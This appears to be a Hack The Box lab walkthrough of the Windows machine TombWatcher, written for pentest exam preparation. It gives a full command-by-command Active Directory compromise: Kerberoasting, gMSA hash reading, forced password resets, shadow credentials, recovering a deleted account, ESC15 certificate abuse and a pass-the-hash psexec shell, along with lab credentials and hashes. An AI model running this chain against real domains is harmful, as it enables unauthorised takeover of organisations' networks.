---
title: "HTB TombWatcher"
date: 2026-05-12 16:32:00 +0100
categories: [CPTS Preparation]
tags: [HTB, Machine, Windows, Medium, ADCS]
image: /assets/img/posts/tombwatcher/tombwatcher.png
---
**HTB TombWatcher** is a Windows machine that starts with valid credentials for `henry:H3nry_987TGV!` on a domain controller (`DC01.tombwatcher.htb`). After BloodHound/RustHound enumeration reveals the attack path, I chained multiple AD abuses: WriteSPN to Kerberoast `Alfred` and crack `basketball`, AddSelf to `INFRASTRUCTURE` group for gMSA `ansible_dev$` NTLM hash, ForceChangePassword on `sam`, WriteOwner/GenericAll on `cert_admin`, and recovered a deleted `cert_admin` account from AD Recycle Bin. With `cert_admin` access, I exploited `ESC15` on the `WebServer` certificate template to request an Administrator certificate, authenticate via PKINIT, and used `psexec` for full domain admin access.
## Machine Information

As is common in real life Windows pentests, you will start the TombWatcher box with credentials for the following account:
```
henry
```
```
H3nry_987TGV!
```
## Reconnaissance
### Scanning
- Nmap (All ports)
```
nmap -p- 10.129.31.233 -nv --min-rate 1000
```
```
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49695/tcp open  unknown
49696/tcp open  unknown
49698/tcp open  unknown
49716/tcp open  unknown
64061/tcp open  unknown
64076/tcp open  unknown
```
- NSE Scripts & Version
```
nmap 10.129.31.233 -sCV -p53,80,88,135,139,389,445,593,636,3268,3269,5985,9389,49667,49695,49696,49698,49716,64061,64076 -nv --min-rate 1000
```
```
PORT      STATE SERVICE       VERSION                                                                                                                        
53/tcp    open  domain        Simple DNS Plus                                                                                                                
80/tcp    open  http          Microsoft IIS httpd 10.0                                                                                                       
|_http-server-header: Microsoft-IIS/10.0                                                                                                                     
|_http-title: IIS Windows Server                                                                                                                             
| http-methods:                                                                                                                                              
|   Supported Methods: OPTIONS TRACE GET HEAD POST                                                                                                           
|_  Potentially risky methods: TRACE                                                                                                                         
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-12 19:49:54Z)                                                                 
135/tcp   open  msrpc         Microsoft Windows RPC                                                                                                          
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn                                                                                                  
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)                               
|_ssl-date: 2026-05-12T19:51:28+00:00; +3h59m58s from scanner time.                                                                                          
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb                                                                                                         
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb                                                          
| Issuer: commonName=tombwatcher-CA-1                                                                                                                        
| Public Key type: rsa                                                                                                                                       
| Public Key bits: 2048                                                                                                                                      
| Signature Algorithm: sha1WithRSAEncryption                                                                                                                 
| Not valid before: 2024-11-16T00:47:59
| Not valid after:  2025-11-16T00:47:59
| MD5:     a396 4dc0 104d 3c58 54e0 19e3 c2ae 0666
| SHA-1:   fe5e 76e2 d528 4a33 8adf c84e 92e3 900e 4234 ef9c
|_SHA-256: 5128 aaea b79b bc06 762a 04d6 b475 4a21 a52c d1b1 205a 0440 85bd f5d6 2734 6ea9
445/tcp   open  microsoft-ds?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-11-16T00:47:59
| Not valid after:  2025-11-16T00:47:59
| MD5:     a396 4dc0 104d 3c58 54e0 19e3 c2ae 0666
| SHA-1:   fe5e 76e2 d528 4a33 8adf c84e 92e3 900e 4234 ef9c
|_SHA-256: 5128 aaea b79b bc06 762a 04d6 b475 4a21 a52c d1b1 205a 0440 85bd f5d6 2734 6ea9
|_ssl-date: 2026-05-12T19:51:29+00:00; +3h59m58s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-11-16T00:47:59
| Not valid after:  2025-11-16T00:47:59
| MD5:     a396 4dc0 104d 3c58 54e0 19e3 c2ae 0666
| SHA-1:   fe5e 76e2 d528 4a33 8adf c84e 92e3 900e 4234 ef9c
|_SHA-256: 5128 aaea b79b bc06 762a 04d6 b475 4a21 a52c d1b1 205a 0440 85bd f5d6 2734 6ea9
|_ssl-date: 2026-05-12T19:51:28+00:00; +3h59m58s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-11-16T00:47:59
| Not valid after:  2025-11-16T00:47:59
| MD5:     a396 4dc0 104d 3c58 54e0 19e3 c2ae 0666
| SHA-1:   fe5e 76e2 d528 4a33 8adf c84e 92e3 900e 4234 ef9c
|_SHA-256: 5128 aaea b79b bc06 762a 04d6 b475 4a21 a52c d1b1 205a 0440 85bd f5d6 2734 6ea9
|_ssl-date: 2026-05-12T19:51:29+00:00; +3h59m58s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49696/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
49716/tcp open  msrpc         Microsoft Windows RPC
64061/tcp open  msrpc         Microsoft Windows RPC
64076/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| smb2-time: 
|   date: 2026-05-12T19:50:49
|_  start_date: N/A
|_clock-skew: mean: 3h59m57s, deviation: 0s, median: 3h59m57s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
```
- Domain: `tombwatcher.htb`
- Host: `DC01`
- Certificate CA: `tombwatcher-CA-1`

### Configuration
- /etc/hosts
```
sudo nxc smb 10.129.31.233 -u henry -p 'H3nry_987TGV!' --generate-hosts-file /etc/hosts
```
- /etc/krb5.conf
```
sudo nxc smb dc01.tombwatcher.htb -u henry -p 'H3nry_987TGV!' --generate-krb5-file /etc/krb5.conf
```
- time
```
sudo rdate -n tombwatcher.htb
```
### Enumeration
- ldap
```
➜  TombWatcher nxc ldap dc01.tombwatcher.htb -u henry -p 'H3nry_987TGV!'
LDAP        10.129.31.233   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) (signing:None) (channel binding:Never)
LDAP        10.129.31.233   389    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV!
```
- winrm
```
➜  TombWatcher nxc winrm dc01.tombwatcher.htb -u henry -p 'H3nry_987TGV!'
WINRM       10.129.31.233   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) 
WINRM       10.129.31.233   5985   DC01             [-] tombwatcher.htb\henry:H3nry_987TGV!
```
- smb
```
➜  TombWatcher nxc smb dc01.tombwatcher.htb -u henry -p 'H3nry_987TGV!'
SMB         10.129.31.253   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.31.253   445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV!
```
- shares
```
➜  TombWatcher nxc smb dc01.tombwatcher.htb -u henry -p 'H3nry_987TGV!' --shares
SMB         10.129.31.253   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.31.253   445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 
SMB         10.129.31.253   445    DC01             [*] Enumerated shares
SMB         10.129.31.253   445    DC01             Share           Permissions     Remark
SMB         10.129.31.253   445    DC01             -----           -----------     ------
SMB         10.129.31.253   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.31.253   445    DC01             C$                              Default share
SMB         10.129.31.253   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.31.253   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.31.253   445    DC01             SYSVOL          READ            Logon server share
```
## Rusthound
### Collection
```
rusthound-ce --domain tombwatcher.htb -u henry -p 'H3nry_987TGV!' -z
```
### Enumeration - BloodHound
![USER_PATH](/assets/img/posts/tombwatcher/path.png)

## Shell
### Henry ➜ Alfred (WriteSPN)
- servicePrincipalName
```
bloodyAD -u henry -p 'H3nry_987TGV!' -d tombwatcher.htb --host 10.129.31.253 set object Alfred servicePrincipalName -v 'http/pwned'
```
- request
```
impacket-GetUserSPNs -request -dc-ip 10.129.31.253 'tombwatcher.htb/henry:H3nry_987TGV!' -request-user Alfred
```
- hashcat
```
hashcat -a 0 -m 13100 hash.txt wordlists/rockyou.txt -d 1 -O
```
- Creds
```
Alfred:basketball
```
### Alfred ➜ INFRASTRUCTURE (AddSelf)
- groupMember
```
bloodyAD -u alfred -p 'basketball' -d tombwatcher.htb --host 10.129.31.253 add groupMember INFRASTRUCTURE alfred
```
### INFRASTRUCTURE ➜ ANSIBLE_DEV$ (ReadGMSAPassword)
```
nxc ldap dc01.tombwatcher.htb -u alfred -p 'basketball' --gmsa
```
- PrincipalsAllowedToReadPassword: Infrastructure
```
Account: ansible_dev$         NTLM: cba56cd2df7d642f622e2a59956f6d47
```
### Ansible_dev$ ➜ Sam (ForceChangePassword)
```
bloodyAD -u 'ansible_dev$' -p ':cba56cd2df7d642f622e2a59956f6d47' -d tombwatcher.htb --host 10.129.31.253 set password sam 'NewP@ssword2026'
```
### Sam ➜ John (WriteOwner)
```
bloodyAD -u sam -p 'NewP@ssword2026' -d tombwatcher.htb --host 10.129.31.253 set owner john sam
bloodyAD -u sam -p 'NewP@ssword2026' -d tombwatcher.htb --host 10.129.31.253 add genericAll john sam
```
- ChangePassword
```
bloodyAD -u sam -p 'NewP@ssword2026' -d tombwatcher.htb --host 10.129.31.253 set password john 'Password123!'
```
- Shadow-Credentiels
```
certipy-ad shadow auto -u 'sam@tombwatcher.htb' -p 'NewP@ssword2026' -account john -dc-ip 10.129.31.253 -ns 10.129.31.253
```
- Evil-winrm
```
evil-winrm -i 10.129.31.253 -u john -p 'Password123!'
```
## ADCS
### OU
![GEN_ALL](/assets/img/posts/tombwatcher/adcs1.png)
### Enrollment rights on published certificate templates
![ENR_WRT](/assets/img/posts/tombwatcher/adcs2.png)
### AD Recycle Bin
- Find Deleted Account
```
Get-ADOptionalFeature 'Recycle Bin Feature'
```
```
Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property objectSid,lastKnownParent
```
![RB](/assets/img/posts/tombwatcher/adcs3.png)
- Recover `cert_admin`
```
Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
Get-ADUser cert_admin
```
### John ➜ OU=ADCS ➜ cert_admin (GenericAll)
- ChangePassword
```
bloodyAD -u john -p 'Password123!' -d tombwatcher.htb --host 10.129.31.253 set password cert_admin 'Password123!'
```
### Administrator
- Enumeration
```
certipy-ad find -target dc01.tombwatcher.htb -u cert_admin -p 'Password123!' -vulnerable -stdout
```
```
Template Name                       : WebServer
...
Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
```
- Exploit
```
certipy-ad req -u cert_admin -p 'Password123!' -dc-ip 10.129.31.253 -target dc01.tombwatcher.htb -ca tombwatcher-CA-1 -template WebServer -upn administrator@tombwatcher.htb -application-policies 'Certificate Request Agent'
```
```
certipy-ad req -u cert_admin -p 'Password123!' -dc-ip 10.129.31.253 -target dc01.tombwatcher.htb -ca tombwatcher-CA-1 -template User -pfx cert_admin.pfx -on-behalf-of 'tombwatcher\Administrator'
```
```
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.31.253
```
```
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:f61db423bebe3328d33af26741afe5fc administrator@10.129.31.253 cmd.exe
```